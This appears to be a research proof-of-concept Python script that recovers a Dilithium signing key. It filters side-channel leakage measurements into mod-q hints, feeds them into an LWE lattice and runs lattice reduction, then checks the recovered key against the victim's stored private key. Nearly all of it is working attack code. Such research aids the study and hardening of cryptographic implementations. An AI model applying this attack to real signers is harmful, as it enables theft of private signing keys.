from lwe_with_hints import *
import itertools
import numpy as np
import time
from random import randrange, shuffle
import configargparse
from math import comb
import pdb

"""
    Extended Euclidean Algorithm
"""
def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)
    
"""
    Mod-q erase dependent vectors
"""
def modq_erase(M, q):
    rows, cols = M.shape
    rowCtr = 0
    eliminatedCoordinates = 0
    independent_row = []

    while rowCtr < rows:
        colCtr = eliminatedCoordinates
        foundInvertible = False
        while colCtr < cols and not foundInvertible:
            g, s, _ = egcd(M[rowCtr,colCtr], q)
            if g==1:
                foundInvertible = True
            else:
                colCtr += 1
    
        if foundInvertible:
        
            M[:,colCtr] *= s
            M[:,colCtr] %= q
        
            if colCtr != eliminatedCoordinates:
                M[:,[eliminatedCoordinates,colCtr]] = M[:,[colCtr,eliminatedCoordinates]]
        
            for colCtr in range(cols):
                if colCtr != eliminatedCoordinates:
                    M[:,colCtr] -= M[rowCtr,colCtr]*M[:,eliminatedCoordinates]
                    M[:,colCtr] %= q
        
            eliminatedCoordinates += 1
            independent_row.append(rowCtr)
    
        rowCtr += 1
    return independent_row


parser = configargparse.ArgParser()
parser.add("--measure_list", required=True, nargs="+", type=int, help="A list of file collected correct signatures")
parser.add("--page_number", type=str, default="0x10000", help="lower 32 bits page number")
parser.add("--num_hints", type=int, default=876, help="number of mod-q hints to break dilithium")
parser.add("--neg", default=False, action='store_true', help="use neg file or not")
args = parser.parse_args()

N = 256
q = 8380417
k = 4
l = 4
_, invR, _ = egcd(4193792, q)
invR = invR % q

y_dir = f"./dilithium_data/{args.page_number}/dilithium_y/"
attacker_dir = "./crypto_attacker/"
victim_dir = "./crypto_victim/"
c_parse_dir = f"./dilithium_data/{args.page_number}/dilithium_c_parsed/"

all_collected = []
neg_set = set()
wrong_set = set()
for file_num in args.measure_list:
    print(f"--------------------Load File {file_num}--------------------")
    # load attacker measurement file
    with open(attacker_dir+f"dilithium_positive_{file_num}.txt", 'r') as f_attacker:
        leak_coordinate_list = f_attacker.readlines()
    with open(attacker_dir+f"dilithium_negative_{file_num}.txt", 'r') as f_neg:
        neg_coordinate_list = [eval(neg_coordinate.strip()) for neg_coordinate in f_neg.readlines()]
    neg_set = neg_set | set(neg_coordinate_list)

    # examine the accuracy of leakage
    cur_collected = []
    wrong_list = []
    num_leaked = 0
    correct_leaked = 0
    for leak_coordinate in leak_coordinate_list:
        ptr_idx, msg_idx = eval(leak_coordinate.strip())
        cur_collected.append((ptr_idx, msg_idx))
        # load corresponding y ptr
        with open(y_dir+f"y_{ptr_idx}.txt") as f_y:
            y_ptr = f_y.readlines()[msg_idx].strip()
        if "0x140" in y_ptr:
            correct_leaked += 1
        else:
            print(f"Wrong Leakage: ({ptr_idx}, {msg_idx})")
            wrong_list.append((ptr_idx, msg_idx))
        num_leaked += 1
    all_collected.append(cur_collected)
    wrong_set = wrong_set | set(wrong_list)
    print(f"[+] Accuracy: {correct_leaked/num_leaked*100.0}% ({correct_leaked}/{num_leaked})")

# Get intersection
print("--------------------Combined--------------------")
inter_collected = set()
for combin_pair in itertools.combinations(all_collected, 2):
    inter_collected = inter_collected | set.intersection(*map(set, list(combin_pair)))
other_collected = set.union(*map(set, all_collected)) - inter_collected
if args.neg:
    inter_collected = inter_collected - neg_set
    other_collected = other_collected - neg_set
    wrong_set = wrong_set - neg_set
wrong_msg_intersec = len(inter_collected & wrong_set)
wrong_msg_other = len(other_collected & wrong_set)
print(f"[+] Num of intersection msg: {len(inter_collected)} (contain {wrong_msg_intersec} wrong msg)")
print(f"[+] Num of other msg: {len(other_collected)} (contain {wrong_msg_other} wrong msg)")
# analyze wrong message and corresponding error rate
if len(inter_collected) >= args.num_hints:
    print(f"[+] Success rate: {comb(len(inter_collected)-wrong_msg_intersec, args.num_hints)/comb(len(inter_collected), args.num_hints)*100.0}%")
else:
    if wrong_msg_intersec > 0:
        print(f"[+] Success rate: 0% (intersection contains wrong msg!!)")
    else:
        print(f"[+] Success rate: {comb(len(other_collected)-wrong_msg_other, args.num_hints-len(inter_collected))/comb(len(other_collected), args.num_hints-len(inter_collected))*100.0}%")
other_collected = list(other_collected)
# Get enough independent hints
hints = []
chosen_coordinate = list(inter_collected)
# Append hints in intersection
for leak_coordinate in inter_collected:
    ptr_idx, msg_idx = leak_coordinate
    with open(c_parse_dir+f"cp_{ptr_idx}.txt", 'r') as f_cp:
        c = [int(x) for x in f_cp.readlines()[msg_idx].strip().split(' ')]
    hints.append(c)
if len(hints) > 1:
    independent_row = modq_erase(np.array(hints), q)
    hints = list(np.array(hints)[independent_row])
    chosen_coordinate = list(np.array(chosen_coordinate)[independent_row])
    print(f"randomly sample other collection, get {len(hints)} hints")
# Get other hints to meet #hints
while len(hints) < args.num_hints:
    sup_len = int((args.num_hints-len(hints)) * 1.2)
    shuffle(other_collected)
    pending_pairs = other_collected[:sup_len]
    other_collected = other_collected[sup_len:]
    for leak_coordinate in pending_pairs:
        ptr_idx, msg_idx = leak_coordinate
        with open(c_parse_dir+f"cp_{ptr_idx}.txt", 'r') as f_cp:
            c = [int(x) for x in f_cp.readlines()[msg_idx].strip().split(' ')]
        hints.append(c)
    chosen_coordinate += pending_pairs
    independent_row = modq_erase(np.array(hints), q)
    hints = list(np.array(hints)[independent_row])
    chosen_coordinate = list(np.array(chosen_coordinate)[independent_row])
    print(f"randomly sample other collection, get {len(hints)} hints")
hints = hints[:args.num_hints]
chosen_coordinate = chosen_coordinate[:args.num_hints]
num_leaked = 0
correct_leaked = 0
for leak_coordinate in chosen_coordinate:
    ptr_idx, msg_idx = leak_coordinate
    # load corresponding y ptr
    with open(y_dir+f"y_{ptr_idx}.txt") as f_y:
        y_ptr = f_y.readlines()[msg_idx].strip()
    if "0x140" in y_ptr:
        correct_leaked += 1
    else:
        print(f"Wrong Leakage: ({ptr_idx}, {msg_idx})")
    num_leaked += 1
print(f"[+] Accuracy: {correct_leaked/num_leaked*100.0}% ({correct_leaked}/{num_leaked})")
pdb.set_trace()
# load public key A & t
with open(victim_dir+"dilithium_pub.txt", 'r') as f_pub:
    A_str, t_str = f_pub.readlines()
A_raw = eval(A_str.strip().replace(" ", ","))
t_raw = eval(t_str.strip().replace(" ", ","))
t = []
A = []

for i in range(k):
    t += t_raw[i]
    for j in range(l):
        A.append(np.array(A_raw[j][i]) * invR % q)

A = module(A, k, l)
t = np.array(t)

# open the secret key file
with open(victim_dir+"dilithium_priv.txt", 'r') as f_v:
    secret_key_str1, secret_key_str2 = f_v.readlines()
secret_key1 = eval(secret_key_str1.strip().replace(' ',','))
secret_key2 = eval(secret_key_str2.strip().replace(' ',','))
secret_key_flat1 = []
secret_key_flat2 = []
for i in range(l):
    secret_key_flat1 += secret_key1[i]
for i in range(k):
    secret_key_flat2 += secret_key2[i]
t_computed = (np.array(secret_key_flat1).dot(A) % q + secret_key_flat2) % q
assert not False in (t == t_computed)

# generate lattice
lattice = LWELattice(A, t, q, verbose=True)

# generate modular hint
for idx, hint in enumerate(hints):
    try:
        assert np.array(hint).dot(np.array(secret_key_flat1)) % q == 0
    except AssertionError:
        pdb.set_trace()
    lattice.integrateModularHint( np.array(hint), 0, q )

# lattice reduction
start = time.time()
lattice.reduce()
end = time.time()

print(f"[+] Finishing -> Time consumption: {end-start}")
print(lattice.s)
with open(attacker_dir+"dilithium_reduction.txt", 'w') as f_r:
    for i in range(len(lattice.s)):
        f_r.write(f"{lattice.s[i]}\n")

# open secret key file and compare

count = 0
for i in range(len(secret_key_flat1)):
    if int(secret_key_flat1[i]) % q == lattice.s[i] % q:
        count += 1
print(f"Accuracy: {count}/{len(secret_key_flat1)}")